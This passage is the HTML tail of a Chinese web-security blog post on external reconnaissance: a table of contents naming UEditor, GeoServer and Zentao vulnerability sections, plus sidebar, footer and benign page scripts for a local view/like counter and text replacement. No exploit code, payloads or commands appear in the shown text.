data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-part4%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD"><span class="toc-number">1.</span> <span class="toc-text"> 常规外网打点-PART4（持续更新中......）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ueditor"><span class="toc-number">1.1.</span> <span class="toc-text"> UEditor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E7%89%B9%E5%BE%81"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 指纹特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#net%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.2.</span> <span class="toc-text"> .NET版本任意文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf"><span class="toc-number">1.1.3.</span> <span class="toc-text"> SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 文件上传导致存储型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#geoserver"><span class="toc-number">1.2.</span> <span class="toc-text"> GeoServer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E7%89%B9%E5%BE%81-2"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 指纹特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0rce-cve-2024-36401"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 属性名表达式前台RCE CVE-2024-36401</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ogc-filter-sql%E6%B3%A8%E5%85%A5-cve-2023-25157"><span class="toc-number">1.2.4.</span> <span class="toc-text"> OGC Filter SQL注入 CVE-2023-25157</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jai-ext%E5%AF%BC%E8%87%B4rce-cve-2022-24816cve-2023-35042"><span class="toc-number">1.2.5.</span> <span class="toc-text"> JAI-EXT导致RCE CVE-2022-24816&#x2F;CVE-2023-35042</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-cve-2025-58360"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 未授权XML外部实体注入 CVE-2025-58360</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2023-51444"><span class="toc-number">1.2.7.</span> <span class="toc-text"> 文件上传漏洞 CVE-2023-51444</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xpath-rce-cve-2024-36401"><span class="toc-number">1.2.8.</span> <span class="toc-text"> XPath RCE CVE-2024-36401</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%85%E9%81%93"><span class="toc-number">1.3.</span> <span class="toc-text"> 禅道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E7%89%B9%E5%BE%81-3"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 指纹特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-qvd-2024-15263"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 身份认证绕过漏洞 QVD-2024-15263</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5-cnvd-2022-42853"><span class="toc-number">1.3.3.</span> <span class="toc-text"> SQL注入 CNVD-2022-42853</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">20</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/27/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/19/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/09/05/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART4/">常规外网打点-PART4</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/20/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EPython%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Pickle反序列化与Python原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/28/RCE/">RCE</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/17/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART3/">常规外网打点-PART3</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/18/SQL%E6%8F%90%E6%9D%83/">SQL提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/24/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/23/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">551k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">8:21</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/09/05/常规外网打点-PART4/`,
+    favicon: {
+        show: `ZLARYY`,
+        hide: `ZLARYY`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script><!-- hexo injector body_end start -->
+<script id="post-stats">
+(function () {
+  var API_NAME = 'ZLARYYPostStats';
+  var BOX_SELECTOR = '.post-stats-box';
+  var COUNT_LIMIT = 9999;
+
+  if (window[API_NAME] && typeof window[API_NAME].run === 'function') {
+    window[API_NAME].run();
+    return;
+  }
+
+  function isPostPage() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function storageKey(prefix) {
+    return prefix + window.location.pathname;
+  }
+
+  function getStorageValue(storage, key) {
+    try {
+      return storage.getItem(key);
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function setStorageValue(storage, key, value) {
+    try {
+      storage.setItem(key, value);
+    } catch (error) {}
+  }
+
+  function removeStorageValue(storage, key) {
+    try {
+      storage.removeItem(key);
+    } catch (error) {}
+  }
+
+  function readCount(key) {
+    var raw = getStorageValue(window.localStorage, key);
+    var value = raw === null || raw === '' ? 0 : Number(raw);
+
+    if (!Number.isInteger(value) || value < 0 || value > COUNT_LIMIT) {
+      value = 0;
+      setStorageValue(window.localStorage, key, '0');
+    }
+
+    return value;
+  }
+
+  function writeCount(key, value) {
+    setStorageValue(window.localStorage, key, String(value));
+  }
+
+  function bumpViewCount() {
+    var countKey = storageKey('zlaryy_view_count_');
+    var sessionKey = storageKey('zlaryy_viewed_session_');
+    var count = readCount(countKey);
+
+    if (getStorageValue(window.sessionStorage, sessionKey) !== '1') {
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      writeCount(countKey, count);
+      setStorageValue(window.sessionStorage, sessionKey, '1');
+    }
+
+    return count;
+  }
+
+  function readLikeCount() {
+    return readCount(storageKey('zlaryy_like_count_'));
+  }
+
+  function hasLiked() {
+    return getStorageValue(window.localStorage, storageKey('zlaryy_liked_')) === '1';
+  }
+
+  function saveLikeState(count, liked) {
+    writeCount(storageKey('zlaryy_like_count_'), count);
+    if (liked) {
+      setStorageValue(window.localStorage, storageKey('zlaryy_liked_'), '1');
+    } else {
+      removeStorageValue(window.localStorage, storageKey('zlaryy_liked_'));
+    }
+  }
+
+  function clearRewardNodes() {
+    document.querySelectorAll('.reward').forEach(function (reward) {
+      reward.innerHTML = '';
+      reward.classList.add('post-stats-host');
+      reward.removeAttribute('style');
+      reward.setAttribute('aria-label', 'post stats');
+    });
+  }
+
+  function findInsertTarget() {
+    var reward = document.querySelector('article.post .reward, .reward');
+    if (reward) return { parent: reward, before: null };
+
+    var footer = document.querySelector('article.post > footer');
+    if (footer && footer.parentNode) return { parent: footer.parentNode, before: footer };
+
+    var article = document.querySelector('article.post');
+    if (article) return { parent: article, before: null };
+
+    return null;
+  }
+
+  function createStatsBox(viewCount, likeCount, liked) {
+    var box = document.createElement('div');
+    box.className = 'post-stats-box';
+    box.innerHTML = [
+      '<button class="post-view-count" type="button" disabled aria-disabled="true">',
+      '&#128065; &#x770b;&#x8fc7; <span class="local-view-count">' + viewCount + '</span> &#x6b21;',
+      '</button>',
+      '<button class="post-like-btn' + (liked ? ' liked' : '') + '" type="button" aria-pressed="' + (liked ? 'true' : 'false') + '">',
+      '<span class="post-like-label">' + (liked ? '&#x5df2;&#x70b9;&#x8d5e;' : '&#x70b9;&#x8d5e;') + '</span> ',
+      '<span class="local-like-count">' + likeCount + '</span>',
+      '</button>'
+    ].join('');
+
+    return box;
+  }
+
+  function updateLikeButton(button, count, liked) {
+    var labelNode = button.querySelector('.post-like-label');
+    var countNode = button.querySelector('.local-like-count');
+
+    if (labelNode) labelNode.textContent = liked ? '\u5df2\u70b9\u8d5e' : '\u70b9\u8d5e';
+    if (countNode) countNode.textContent = String(count);
+
+    button.classList.toggle('liked', liked);
+    button.setAttribute('aria-pressed', liked ? 'true' : 'false');
+  }
+
+  function bindLikeButton(box) {
+    var button = box.querySelector('.post-like-btn');
+    if (!button || button.dataset.bound === 'true') return;
+
+    updateLikeButton(button, readLikeCount(), hasLiked());
+
+    button.dataset.bound = 'true';
+    button.addEventListener('click', function () {
+      var count = readLikeCount();
+
+      if (hasLiked()) {
+        count = Math.max(0, count - 1);
+        saveLikeState(count, false);
+        updateLikeButton(button, count, false);
+        return;
+      }
+
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      saveLikeState(count, true);
+      updateLikeButton(button, count, true);
+    });
+  }
+
+  function renderStats() {
+    if (!isPostPage()) return;
+
+    clearRewardNodes();
+
+    var viewCount = bumpViewCount();
+    var likeCount = readLikeCount();
+    var liked = hasLiked();
+    var box = document.querySelector(BOX_SELECTOR);
+
+    if (!box) {
+      var target = findInsertTarget();
+      if (!target) return;
+
+      box = createStatsBox(viewCount, likeCount, liked);
+      target.parent.insertBefore(box, target.before);
+    }
+
+    var viewNode = box.querySelector('.local-view-count');
+    var likeNode = box.querySelector('.local-like-count');
+    var likeButton = box.querySelector('.post-like-btn');
+
+    if (viewNode) viewNode.textContent = String(viewCount);
+    if (likeNode) likeNode.textContent = String(likeCount);
+    if (likeButton) {
+      updateLikeButton(likeButton, likeCount, liked);
+    }
+
+    bindLikeButton(box);
+  }
+
+  function runPostStats() {
+    window.setTimeout(renderStats, 0);
+  }
+
+  window[API_NAME] = {
+    run: runPostStats
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', runPostStats);
+  } else {
+    runPostStats();
+  }
+
+  document.addEventListener('pjax:complete', runPostStats);
+})();
+</script>
+  
+<script>
+(function () {
+  function addBeian() {
+    const footerStatus = document.querySelector('#footer .status');
+    if (!footerStatus) return;
+
+    if (document.querySelector('.footer-beian')) return;
+
+    const beian = document.createElement('div');
+    beian.className = 'footer-beian';
+    beian.innerHTML = '<a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">蜀ICP备2026016552号-1</a>';
+
+    footerStatus.appendChild(beian);
+  }
+
+  addBeian();
+  document.addEventListener('pjax:complete', addBeian);
+})();
+</script>
+  <script>
+(function () {
+  function fixText(text) {
+    if (!text) return text;
+    text = text.replace(/\([`´]?Д[`´]?\)大変だ!/g, "ZLARYY");
+    text = text.replace(/大変だ!/g, "ZLARYY");
+    return text;
+  }
+
+  function replaceText(root) {
+    root = root || document.body;
+    if (!root) return;
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+
+    while ((node = walker.nextNode())) {
+      var oldText = node.nodeValue;
+      var newText = fixText(oldText);
+      if (newText !== oldText) node.nodeValue = newText;
+    }
+  }
+
+  function init() {
+    replaceText(document.body);
+
+    var observer = new MutationObserver(function (mutations) {
+      mutations.forEach(function (mutation) {
+        mutation.addedNodes.forEach(function (node) {
+          if (node.nodeType === 1) {
+            replaceText(node);
+          } else if (node.nodeType === 3) {
+            node.nodeValue = fixText(node.nodeValue);
+          }
+        });
+      });
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+</script><!-- hexo injector body_end end --></body></html>
